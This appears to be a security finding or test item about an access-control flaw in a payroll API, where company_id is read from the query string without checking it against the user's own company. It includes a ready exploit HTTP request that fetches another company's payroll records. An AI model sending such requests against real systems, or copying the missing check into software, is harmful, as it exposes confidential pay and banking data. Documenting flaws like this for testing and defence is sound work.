diagnosis: PayrollResource implements apply_authorization_limits by reading company_id directly from request.GET without checking that request.user.company_id matches the parameter. An authenticated employee from one corporation can pass another company's ID in the query string and retrieve confidential payroll records, executive compensation, and bank disbursement details.
exploit_request:
GET /api/v1/payroll/?company_id=992 HTTP/1.1
Host: payroll.enterprise-hr.org
Cookie: sessionid=valid_logged_in_employee_cookie
Accept: application/json
